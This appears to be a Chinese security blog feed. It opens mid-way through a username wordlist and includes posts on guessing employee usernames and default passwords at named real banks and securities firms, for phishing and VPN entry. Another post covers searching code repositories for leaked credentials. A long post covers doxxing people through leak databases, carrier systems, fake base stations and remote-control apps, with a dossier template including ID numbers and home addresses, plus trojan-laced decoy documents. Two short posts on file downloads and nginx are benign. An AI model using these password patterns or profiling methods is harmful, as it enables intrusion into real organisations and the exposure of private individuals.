class="line">zhanglh</span><br><span class="line">zhangli</span><br><span class="line">zhangliang</span><br><span class="line">zhanglihua</span><br><span class="line">zhanglijuan</span><br><span class="line">zhanglili</span><br><span class="line">zhanglin</span><br><span class="line">zhangling</span><br><span class="line">zhanglj</span><br><span class="line">zhangll</span><br><span class="line">zhanglong</span><br><span class="line">zhangly</span><br><span class="line">zhangm</span><br><span class="line">zhangmei</span><br><span class="line">zhangmin</span><br><span class="line">zhangming</span><br><span class="line">zhangn</span><br><span class="line">zhangna</span><br><span class="line">zhangnan</span><br><span class="line">zhangning</span><br><span class="line">zhangp</span><br><span class="line">zhangpeng</span><br><span class="line">zhangping</span><br><span class="line">zhangq</span><br><span class="line">zhangqian</span><br><span class="line">zhangqiang</span><br><span class="line">zhangqin</span><br><span class="line">zhangr</span><br><span class="line">zhangrong</span><br><span class="line">zhangrui</span><br><span class="line">zhangs</span><br><span class="line">zhangshuai</span><br><span class="line">zhangshulan</span><br><span class="line">zhangshuying</span><br><span class="line">zhangshuzhen</span><br><span class="line">zhangsl</span><br><span class="line">zhangsy</span><br><span class="line">zhangsz</span><br><span class="line">zhangt</span><br><span class="line">zhangtao</span><br><span class="line">zhangting</span><br><span class="line">zhangtingting</span><br><span class="line">zhangtt</span><br><span class="line">zhangw</span><br><span class="line">zhangwei</span><br><span class="line">zhangwen</span><br><span class="line">zhangx</span><br><span class="line">zhangxf</span><br><span class="line">zhangxh</span><br><span class="line">zhangxia</span><br><span class="line">zhangxin</span><br><span class="line">zhangxiufang</span><br><span class="line">zhangxiuhua</span><br><span class="line">zhangxiulan</span><br><span class="line">zhangxiumei</span><br><span class="line">zhangxiurong</span><br><span class="line">zhangxiuying</span><br><span class="line">zhangxiuyun</span><br><span class="line">zhangxiuzhen</span><br><span class="line">zhangxl</span><br><span class="line">zhangxm</span><br><span class="line">zhangxr</span><br><span class="line">zhangxu</span><br><span class="line">zhangxue</span><br><span class="line">zhangxy</span><br><span class="line">zhangxz</span><br><span class="line">zhangy</span><br><span class="line">zhangyan</span><br><span class="line">zhangyh</span><br><span class="line">zhangying</span><br><span class="line">zhangyl</span><br><span class="line">zhangym</span><br><span class="line">zhangyong</span><br><span class="line">zhangyu</span><br><span class="line">zhangyuhua</span><br><span class="line">zhangyulan</span><br><span class="line">zhangyumei</span><br><span class="line">zhangyun</span><br><span class="line">zhangyuying</span><br><span class="line">zhangyuzhen</span><br><span class="line">zhangyy</span><br><span class="line">zhangyz</span><br><span class="line">zhangzhiqiang</span><br><span class="line">zhangzq</span><br><span class="line">zhao</span><br><span class="line">zhaoj</span><br><span class="line">zhaojing</span><br><span class="line">zhaojun</span><br><span class="line">zhaol</span><br><span class="line">zhaoli</span><br><span class="line">zhaom</span><br><span class="line">zhaomin</span><br><span class="line">zhaow</span><br><span class="line">zhaowei</span><br><span class="line">zhaoxiuying</span><br><span class="line">zhaoxy</span><br><span class="line">zhaoy</span><br><span class="line">zhaoyong</span><br><span class="line">zhm</span><br><span class="line">zhong</span><br><span class="line">zhongmei</span><br><span class="line">zhouj</span><br><span class="line">zhoujie</span><br><span class="line">zhoujing</span><br><span class="line">zhoul</span><br><span class="line">zhouli</span><br><span class="line">zhoum</span><br><span class="line">zhoumin</span><br><span class="line">zhouw</span><br><span class="line">zhouwei</span><br><span class="line">zhouy</span><br><span class="line">zhouyong</span><br><span class="line">zhua</span><br><span class="line">zhui</span><br><span class="line">zhy</span><br><span class="line">zj</span><br><span class="line">zjg</span><br><span class="line">zjh</span><br><span class="line">zjian</span><br><span class="line">zjianguo</span><br><span class="line">zjianhua</span><br><span class="line">zjianjun</span><br><span class="line">zjie</span><br><span class="line">zjing</span><br><span class="line">zjj</span><br><span class="line">zjuan</span><br><span class="line">zjun</span><br><span class="line">zk</span><br><span class="line">zkai</span><br><span class="line">zkun</span><br><span class="line">zl</span><br><span class="line">zlanying</span><br><span class="line">zlei</span><br><span class="line">zlh</span><br><span class="line">zli</span><br><span class="line">zliang</span><br><span class="line">zlihua</span><br><span class="line">zlijuan</span><br><span class="line">zlili</span><br><span class="line">zlin</span><br><span class="line">zling</span><br><span class="line">zlj</span><br><span class="line">zll</span><br><span class="line">zlong</span><br><span class="line">zly</span><br><span class="line">zm</span><br><span class="line">zmei</span><br><span class="line">zmin</span><br><span class="line">zming</span><br><span class="line">zn</span><br><span class="line">zna</span><br><span class="line">znan</span><br><span class="line">zning</span><br><span class="line">zp</span><br><span class="line">zpeng</span><br><span class="line">zping</span><br><span class="line">zq</span><br><span class="line">zqian</span><br><span class="line">zqiang</span><br><span class="line">zqin</span><br><span class="line">zr</span><br><span class="line">zrong</span><br><span class="line">zrui</span><br><span class="line">zs</span><br><span class="line">zshuai</span><br><span class="line">zshulan</span><br><span class="line">zshuying</span><br><span class="line">zshuzhen</span><br><span class="line">zsl</span><br><span class="line">zsy</span><br><span class="line">zsz</span><br><span class="line">zt</span><br><span class="line">ztao</span><br><span class="line">zting</span><br><span class="line">ztingting</span><br><span class="line">ztt</span><br><span class="line">zw</span><br><span class="line">zwei</span><br><span class="line">zwen</span><br><span class="line">zx</span><br><span class="line">zxf</span><br><span class="line">zxh</span><br><span class="line">zxia</span><br><span class="line">zxin</span><br><span class="line">zxiufang</span><br><span class="line">zxiuhua</span><br><span class="line">zxiulan</span><br><span class="line">zxiumei</span><br><span class="line">zxiurong</span><br><span class="line">zxiuying</span><br><span class="line">zxiuyun</span><br><span class="line">zxiuzhen</span><br><span class="line">zxl</span><br><span class="line">zxm</span><br><span class="line">zxr</span><br><span class="line">zxu</span><br><span class="line">zxue</span><br><span class="line">zxy</span><br><span class="line">zxz</span><br><span class="line">zy</span><br><span class="line">zyan</span><br><span class="line">zyh</span><br><span class="line">zying</span><br><span class="line">zyl</span><br><span class="line">zym</span><br><span class="line">zyong</span><br><span class="line">zyu</span><br><span class="line">zyuhua</span><br><span class="line">zyulan</span><br><span class="line">zyumei</span><br><span class="line">zyun</span><br><span class="line">zyuying</span><br><span class="line">zyuzhen</span><br><span class="line">zyy</span><br><span class="line">zyz</span><br><span class="line">zzhiqiang</span><br><span class="line">zzq</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>强弱密码爆破的姿势</title>
    <url>/2024/09/10/%E5%BC%BA%E5%BC%B1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们都知道银行,证券等金融公司一般来说的默认密码,都是强弱密码的,那么如何猜出强弱密码就是我们可以探讨的一个点,以下是笔者爆破思路的一个小小总结<br>注: 所有案例出现的名字,随便互联网找的一个名字,并没有实际在未授权的请求下,非法渗透过</p>
<h3 id="总结的攻击手法"><a href="#总结的攻击手法" class="headerlink" title="总结的攻击手法"></a>总结的攻击手法</h3><p>OA账号爆破，发公文钓鱼<br>email邮箱爆破，定向发邮件钓鱼【成功率高】<br>vpn账号爆破，进入办公网，继续深入<br>sso单点登录，深入测试其他系统</p>
<h3 id="账号查找规则"><a href="#账号查找规则" class="headerlink" title="账号查找规则"></a>账号查找规则</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓全称+名全称</span><br><span class="line">例如: 张伟明 = zhangweiming</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓全称+名简称</span><br><span class="line">例如: 张伟明 = zhangwm</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓全称+花名简称</span><br><span class="line">例如: 真名叫张伟明 </span><br><span class="line">花名叫阳微</span><br><span class="line">zhangyw</span><br><span class="line">总的来说,按照 姓全称+名简称 来爆破即可</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓简称+明全称</span><br><span class="line">例如: 张伟明 = zweiming</span><br><span class="line"></span><br><span class="line">姓简称+明简称</span><br><span class="line">例如: 张伟明 = zwm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">明全称+姓全称</span><br><span class="line">例如: 张伟明 = weimingzhang</span><br><span class="line"></span><br><span class="line">明全称+姓简称</span><br><span class="line">例如: 张伟明 = weimingz</span><br><span class="line"></span><br><span class="line">明简称+姓简称</span><br><span class="line">例如: 张伟明 = wmz</span><br><span class="line"></span><br><span class="line">中文姓+中文姓名</span><br><span class="line">例如: 张伟明</span><br><span class="line">登录的时候就输入中文名</span><br><span class="line"></span><br><span class="line">注: 比较少见,但是的却遇到过</span><br></pre></td></tr></table></figure>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>实际就是方法一的扩展,实战遇到挺多的,尤其是银行,证券基本都喜欢这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓全称+名全称+@+公司主域名</span><br><span class="line">姓全称+名简称+@+公司主域名</span><br><span class="line">姓全称+花名简称+@+公司主域名</span><br><span class="line">姓简称+明全称+@+公司主域名</span><br><span class="line">姓简称+明简称+@+公司主域名</span><br><span class="line">明全称+姓全称+@+公司主域名</span><br><span class="line">明全称+姓简称+@+公司主域名</span><br><span class="line">明简称+姓简称+@+公司主域名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">例如: 山西证券</span><br><span class="line">规则: 账号+@+公司主域名</span><br><span class="line">山西证券公司主域名 = sxzq.com</span><br><span class="line"></span><br><span class="line">姓全称+名全称+@+公司主域名</span><br><span class="line">例如: 张伟明 = zhangweiming@sxzq.com</span><br><span class="line">其它的类似,自行扩展</span><br></pre></td></tr></table></figure>

<h3 id="弱口令规则"><a href="#弱口令规则" class="headerlink" title="弱口令规则"></a>弱口令规则</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>如何拥有一个通用的密码,也是我们的难点之一,所以以下介绍的是我目前职业生涯中所有遇到的密码生成规则</p>
<p>注: 并没有对该公司进行过非法攻击与爆破,公司是随便找的,出现这个是因为刚好百度看到了该公司的股票</p>
<p>例如: 山西证券<br>山西证券公司主域名 &#x3D; sxzq.com<br>公司简称 &#x3D; sxzq<br>公司证券代码 &#x3D; 002500</p>
<h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码: 账号@123</span><br><span class="line">密码: 账号@1234</span><br><span class="line">密码: 账号@12345</span><br><span class="line">密码: 账号@123456</span><br><span class="line">密码: 账号#123</span><br><span class="line">密码: 账号#1234</span><br><span class="line">密码: 账号#12345</span><br><span class="line">密码: 账号#123456</span><br><span class="line">这样来爆破</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: zhangweiming@sxzq.com</span><br><span class="line">密码: zhangweiming@123</span><br><span class="line">密码: zhangweiming#123456</span><br></pre></td></tr></table></figure>

<h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码: 公司简称@年份</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: zhangweiming@sxzq.com</span><br><span class="line">密码可以是:</span><br><span class="line">sxzq@2010</span><br><span class="line">sxzq@2011</span><br><span class="line">sxzq@2012</span><br><span class="line">sxzq@2013</span><br><span class="line">...</span><br><span class="line">sxzq@2019</span><br><span class="line">sxzq@2020</span><br><span class="line">sxzq@2021</span><br><span class="line">sxzq@2022</span><br></pre></td></tr></table></figure>

<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码: 公司简称@姓名小写首字母</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: zhangwei</span><br><span class="line">密码: sxzq@z</span><br><span class="line"></span><br><span class="line">账号: liuli</span><br><span class="line">密码: sxzq@l</span><br></pre></td></tr></table></figure>

<h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码1: 公司简称@证券代码</span><br><span class="line">密码2: 公司简称=证券代码</span><br><span class="line">密码3: 公司简称证券代码</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: zhangwei</span><br><span class="line">密码1: sxzq@002500</span><br><span class="line">密码2: sxzq=002500</span><br><span class="line">密码3: sxzq002500</span><br></pre></td></tr></table></figure>

<h4 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码: 公司简称+@+弱口令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: zhangwei</span><br><span class="line">密码1: sxzq@123</span><br><span class="line">密码2: sxzq@123456</span><br></pre></td></tr></table></figure>

<h4 id="方法六"><a href="#方法六" class="headerlink" title="方法六"></a>方法六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码: 公司主域名+@+弱口令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><figcaption><span>案例</span></figcaption><table><tr><td class="code"><pre><span class="line">山西证券公司主域名 = sxzq.com</span><br><span class="line">去掉垃圾后缀 = sxzq</span><br><span class="line">注: 一般来说某个公司的域名与公司简称都是不太一样的,这个一样纯属巧合</span><br><span class="line"></span><br><span class="line">账号: liuli</span><br><span class="line">密码1: sxzq@123</span><br><span class="line">密码2: sxzq@123456</span><br></pre></td></tr></table></figure>

<h4 id="方法七"><a href="#方法七" class="headerlink" title="方法七"></a>方法七</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如: 东莞农村商业银行官网</span><br><span class="line">官网: https://www.drcbank.com/</span><br><span class="line">去掉垃圾后缀 = drcbank</span><br><span class="line">那么密码就可以是:</span><br><span class="line">drcbank123</span><br><span class="line">drcbank1234</span><br><span class="line">drc123456</span><br><span class="line">drc123</span><br><span class="line">drc1234</span><br><span class="line">Drc123</span><br><span class="line">Drc1234</span><br></pre></td></tr></table></figure>

<h4 id="方法八"><a href="#方法八" class="headerlink" title="方法八"></a>方法八</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码等于账号</span><br><span class="line">密码: 账号</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">账号: hyc11245</span><br><span class="line">密码: hyc11245</span><br></pre></td></tr></table></figure>

<h4 id="方法九"><a href="#方法九" class="headerlink" title="方法九"></a>方法九</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号: 工号(最多六位数)</span><br><span class="line">密码: 公司简称+工号(不足六位的公司简称后面补零)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 案例</span><br><span class="line">// 例如: 华泰 = ht</span><br><span class="line">账号1: 7211</span><br><span class="line">密码1: ht007211</span><br><span class="line"></span><br><span class="line">账号2: 10510</span><br><span class="line">密码2: ht010510</span><br><span class="line"></span><br><span class="line">账号3: 12919</span><br><span class="line">密码3: ht012919</span><br><span class="line"></span><br><span class="line">账号4: 259181</span><br><span class="line">密码4: ht259181</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>文件下载示例代码</title>
    <url>/2024/09/10/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srcService.ExportByCid(parseInt(selectVal.value)).then((res: any) =&gt; &#123;</span><br><span class="line">    //获取文件名，需要在后端进行配置</span><br><span class="line">    let filename = res.headers[&#x27;content-disposition&#x27;].split(&#x27;filename=&#x27;)[1].split(&#x27;; filename&#x27;)[0]</span><br><span class="line"></span><br><span class="line">    let type = res.headers[&#x27;content-type&#x27;].split(&#x27;;&#x27;)[0]</span><br><span class="line">    let blob = new Blob([res.data], &#123; type: type &#125;)</span><br><span class="line">    const a = document.createElement(&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    // 创建URL</span><br><span class="line">    const blobUrl = window.URL.createObjectURL(blob)</span><br><span class="line">    a.download = filename</span><br><span class="line">    a.href = blobUrl</span><br><span class="line">    console.log(a)</span><br><span class="line">    document.body.appendChild(a)</span><br><span class="line">    // 下载文件</span><br><span class="line">    a.click()</span><br><span class="line">    // 释放内存</span><br><span class="line">    URL.revokeObjectURL(blobUrl)</span><br><span class="line">    document.body.removeChild(a)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>用yum安装的nginx，报unknown directive “stream”</title>
    <url>/2024/09/10/%E7%94%A8yum%E5%AE%89%E8%A3%85%E7%9A%84nginx%EF%BC%8C%E6%8A%A5unknown-directive-%E2%80%9Cstream%E2%80%9D/</url>
    <content><![CDATA[<p>用yum安装的nginx，报unknown directive “stream”</p>
<p>解决方法：yum install nginx-mod-stream -y</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost modules]# yum install nginx-mod-stream -y</span><br><span class="line"></span><br><span class="line">已安装:</span><br><span class="line">  nginx-mod-stream.x86_64 1:1.20.1-2.el7</span><br></pre></td></tr></table></figure>
<p>安装位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ll /usr/lib64/nginx/modules</span><br><span class="line">总用量 176</span><br><span class="line">-rwxr-xr-x 1 root root 179864 6月   2 08:24 ngx_stream_module.so</span><br></pre></td></tr></table></figure>
<p>nginx配置文件引入stream模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/nginx/nginx.conf</span><br><span class="line"># 加载stream模块</span><br><span class="line">load_module /usr/lib64/nginx/modules/ngx_stream_module.so;</span><br><span class="line">user  nginx;</span><br><span class="line">worker_processes  auto;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>nginx新版本已经不需要load</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# nginx -t</span><br><span class="line">nginx: [emerg] unknown directive &quot;ELF&quot; in /usr/lib64/nginx/modules/ngx_stream_module.so:4</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test failed</span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# nginx -t</span><br><span class="line">nginx: [emerg] module &quot;ngx_stream_module&quot; is already loaded in /usr/share/nginx/modules/mod-stream.conf:1</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test failed</span><br><span class="line">[root@localhost ~]# </span><br><span class="line">[root@localhost ~]# nginx -v</span><br><span class="line">nginx version: nginx/1.20.1</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>社工关键字</title>
    <url>/2024/09/10/%E7%A4%BE%E5%B7%A5%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<h3 id="公共知识库搜索"><a href="#公共知识库搜索" class="headerlink" title="公共知识库搜索"></a>公共知识库搜索</h3><ul>
<li>入职培训</li>
<li>入职</li>
<li>常见弱口令<blockquote>
<p>123456<br>qwer1234<br>abc123<br>…</p>
</blockquote>
</li>
</ul>
<h4 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h4><ul>
<li>jdbc.mysql</li>
<li>uri.mongodb</li>
<li>spring.redis</li>
<li>elasticsearch</li>
<li>username &amp;&amp; “SRC名称”</li>
<li>password &amp;&amp; “SRC名称”</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>社工查人手段和方法</title>
    <url>/2024/09/10/%E7%A4%BE%E5%B7%A5%E6%9F%A5%E4%BA%BA%E6%89%8B%E6%AE%B5%E5%92%8C%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h3 id="0x1-查手机号"><a href="#0x1-查手机号" class="headerlink" title="0x1 查手机号"></a>0x1 查手机号</h3><ul>
<li>TG社工库</li>
<li>脉脉</li>
<li>REG007</li>
<li>企业微信</li>
<li>小红书</li>
<li>钉钉</li>
<li>抖音、微博、微信通过通讯录定位个人信息</li>
<li>联系 网贷&#x2F;催收 协助</li>
<li>第三方风控解决方案提供商 比如 同盾&#x2F;通付盾 可查询关联银行卡信息</li>
<li>运营商 BOSS 系统</li>
<li>全地伪基站信号搜索</li>
<li>社工装远控app</li>
<li>当前省级基站访问权限</li>
</ul>
<h3 id="0x2-查个人信息"><a href="#0x2-查个人信息" class="headerlink" title="0x2 查个人信息"></a>0x2 查个人信息</h3><ul>
<li>TG社工库</li>
<li>百度（贴吧、回答）</li>
<li>github 、码云</li>
<li>语雀</li>
<li>用搜索引擎搜索，建议使用聚合搜索引擎<br>*利用通讯录安全软件 1、电话万能钥匙(可关联手机号到姓名) 2、腾讯手机管家 3、触宝电话</li>
<li>网站平台核查 4、电话邦 网址：<a href="http://www.dianhua.cn/">http://www.dianhua.cn/</a> 5、360手机卫士 网址：<a href="http://cx.shouji.360.cn/">http://cx.shouji.360.cn</a> 6、搜狗号码通 <a href="http://haoma.sogou.com/rz/">http://haoma.sogou.com/rz/</a> 7、百度号码认证 <a href="http://haoma.baidu.com/query">http://haoma.baidu.com/query</a> 8、刑部11司 <a href="http://cop163.com/">http://cop163.com/</a> 9、领英 <a href="http://www.linkedin.com/">http://www.linkedin.com/</a> 可输入姓名查询职业电话等信息 各种企业信息查询网站，见尾部附录。</li>
<li>通过QQ、支付宝、微信、微博、陌陌、易信、钉钉等即时通讯软件* 查看关联手机号码的网络ID信息。</li>
<li>查询手机注册过的网站，再通过这些网站核查注册人的身份信息。</li>
<li>通过DTD、博采等专业软件查询，这个需要推荐加入，需要的警网通查找添加：101865联系后获取加入方法。</li>
<li>中国联通cBSS支撑系统 手机号&#x2F;姓名关联&#x2F;身份证照片 </li>
<li>少量运营商信息 <a href="http://www.showjigenzong.com/shouji-haoma">http://www.showjigenzong.com/shouji-haoma</a></li>
<li>信用数据库 <a href="http://www.xysjk.com/">http://www.xysjk.com/</a></li>
</ul>
<h3 id="信息验证"><a href="#信息验证" class="headerlink" title="信息验证"></a>信息验证</h3><ul>
<li>支付宝转账、微信转账</li>
</ul>
<h3 id="溯源个人画像"><a href="#溯源个人画像" class="headerlink" title="溯源个人画像"></a>溯源个人画像</h3><blockquote>
<p>溯源结果如下：<br>姓名&#x2F;ID：<br>攻击IP：<br>邮箱：<br>手机号：<br>身份证号：<br>QQ:<br>银行卡<br>支付宝<br>常用ID<br>IP地址所属公司：<br>IP地址关联域名：<br>微信&#x2F;微博&#x2F;src&#x2F;id证明：<br>人物照片：<br>跳板机（可选）：<br>关联攻击事件：<br>亲属关系：<br>身份证家庭住址<br>快递收货地址<br>学历&#x2F;小初高大各学校 目标履历素描<br>地理位置： （照片EXIF提取;IP地址;附近的人三角定位，三角定位仅为思路）</p>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://cloud.tencent.com/developer/article/1196410?from=article.detail.1196735">https://cloud.tencent.com/developer/article/1196410?from=article.detail.1196735</a></p>
<p><a href="https://mp.weixin.qq.com/s/DJti2r5nmqbG9KyWBqsHvA">多啦安全-溯源思路总结</a></p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="IP溯源"><a href="#IP溯源" class="headerlink" title="IP溯源"></a>IP溯源</h4><h5 id="IP威胁情报"><a href="#IP威胁情报" class="headerlink" title="IP威胁情报"></a>IP威胁情报</h5><p>寻找IP是否有域名解析，历史域名解析信息。（奇安信白泽yyds）</p>
<h5 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h5><p>通过IP反查接口，反查IP上的域名信息</p>
<h5 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h5><p>通过端口漏洞去进行渗透（自己之前有一个案例就是通过smb的会话枚举，枚举到用户id最终一套溯源溯到目标攻击人员）</p>
<h4 id="域名溯源"><a href="#域名溯源" class="headerlink" title="域名溯源"></a>域名溯源</h4><p>域名威胁情报（历史whois信息、解析的IP信息、历史IP解析信息）<br>域名whois信息（获取到注册人、注册邮箱，这里去看2.3. 邮箱溯源）<br>web渗透（通过漏洞、审计0day等思路反打服务器）</p>
<h4 id="邮件溯源"><a href="#邮件溯源" class="headerlink" title="邮件溯源"></a>邮件溯源</h4><p>邮件服务器IP<br>邮件导出为eml格式，提取发件人IP（获取到IP后，去看1.1. IP溯源思路）</p>
<p>邮件附件文档、附件<br>获取到执行程序、文档（这里去看1.4. 木马溯源）</p>
<h4 id="木马溯源"><a href="#木马溯源" class="headerlink" title="木马溯源"></a>木马溯源</h4><p>木马云沙箱<br>提取C2域名、及一些木马信息</p>
<p>木马反连IP<br>这里不一定是执行程序，可能是文档，放入虚拟机通过wireshark抓取流量抓取外联IP（获取到IP后，去看1.1. IP溯源思路）。</p>
<p>木马逆向<br>对木马进行逆向，看木马是否包含红队物理路径信息，物理路径是否携带用户名ID</p>
<h4 id="蜜罐溯源"><a href="#蜜罐溯源" class="headerlink" title="蜜罐溯源"></a>蜜罐溯源</h4><p>蜜罐搭建<br>搭建思路：有条件每个段搭建几个，把真实业务网站1比1复刻做钓鱼页面。</p>
<h3 id="不同信息的溯源思路"><a href="#不同信息的溯源思路" class="headerlink" title="不同信息的溯源思路"></a>不同信息的溯源思路</h3><p>溯源思路目录：<br>ID溯源<br>域名溯源<br>邮箱溯源<br>手机号溯源<br>QQ溯源<br>姓名溯源<br>社工库<br>ID溯源</p>
<p>github、csdn、博客园、i春秋、freebuf、t00ls、贴吧、微博、抖音、快手、百度贴吧等<br>朋友圈溯源（多加几个群，总会用得上）<br>好友溯源（一个牛逼的大佬能帮你省掉很多事）</p>
<h4 id="域名溯源-1"><a href="#域名溯源-1" class="headerlink" title="域名溯源"></a>域名溯源</h4><p>whois反查<br>whois隐私保护反查思路（域名历史IP解析）<br>搜索引擎</p>
<h4 id="邮箱溯源"><a href="#邮箱溯源" class="headerlink" title="邮箱溯源"></a>邮箱溯源</h4><p>邮箱注册域名<br>邮箱前缀可能是ID、手机号、QQ等信息<br>爱企查、天眼查、企查查反查公司<br>reg007.com查邮箱注册过的网站，通过各个平台找回密码找信息</p>
<h4 id="手机号溯源"><a href="#手机号溯源" class="headerlink" title="手机号溯源"></a>手机号溯源</h4><p>查脉脉、领英，得到毕业院校、工作经历<br>查微博、知乎、github等社交账号<br>微信、支付宝转账，得到部分真实姓名</p>
<h4 id="QQ溯源"><a href="#QQ溯源" class="headerlink" title="QQ溯源"></a>QQ溯源</h4><p>添加好友看QQ名片信息<br>QQ邮箱支付宝转账<br>搜索引擎搜索QQ以及QQ邮箱<br>QQ邮箱历史注册信息</p>
<h4 id="github账号溯源"><a href="#github账号溯源" class="headerlink" title="github账号溯源"></a>github账号溯源</h4><p>commit分支后面加【.patch】可以查看原始信息，如：【<a href="https://github.com/whoadmin/whoadmin.github.io/commit/ff1c035967fdfbdabfae8c305ed2b9ffa5f0de61.patch%E3%80%91">https://github.com/whoadmin/whoadmin.github.io/commit/ff1c035967fdfbdabfae8c305ed2b9ffa5f0de61.patch】</a><br><img src="/images/blog/baf09bd9b4fb98328037f50e10ba7abf.png"></p>
<h4 id="姓名溯源"><a href="#姓名溯源" class="headerlink" title="姓名溯源"></a>姓名溯源</h4><p>缩小范围溯源效果最佳如：姓名 + ID、姓名 + 邮箱、姓名 + 省份&#x2F;地点、姓名 + 手机号、姓名 + QQ、姓名 + 微信<br>搜索引擎</p>
<h4 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h4><p>查询姓名<br>查询手机号<br>查询邮箱<br>查询QQ</p>
<h4 id="溯源的核心"><a href="#溯源的核心" class="headerlink" title="溯源的核心"></a>溯源的核心</h4><p>一个优秀的蓝队必然也是一个优秀的红队。———— 菜鸟选手<br>鱼儿主动上钩（1）<br>    专门拿几台windows 10机器放上工具，放上资料，放上信息，搭建渗透环境渗透工具包，正常使用。正常写蓝队每日防守日报，统计资产数据的excel，这类文档捆绑上木马，资产数据放的是一开始1比1伪造的蜜罐资产。不中马就让对方中蜜罐。蓝队每日防守日报诱导性透露信息。</p>
<p>PS：此处把红队木马专门放到机器上运行，等红队上钩。如果木马免杀效果不佳就把杀软关了，或者放一些被免杀了的杀软。</p>
<p>2.鱼儿主动上钩（2）<br>    真实资产服务器同主动上钩（1），放木马文档、放蜜罐数据、钓出口IP等等。舍不得孩，套不着狼。<br>PS：真真假假，假假真真。红队又该何去何从？</p>
<p>3.近源蓝打红<br>    构造钓鱼网站、问卷钓鱼、程序钓鱼。这类钓鱼不需要做木马什么的，任意被杀，我们只需要获取出口IP，上门干红队。<br>PS：拿着抓来的day干，他山之石可攻玉。</p>
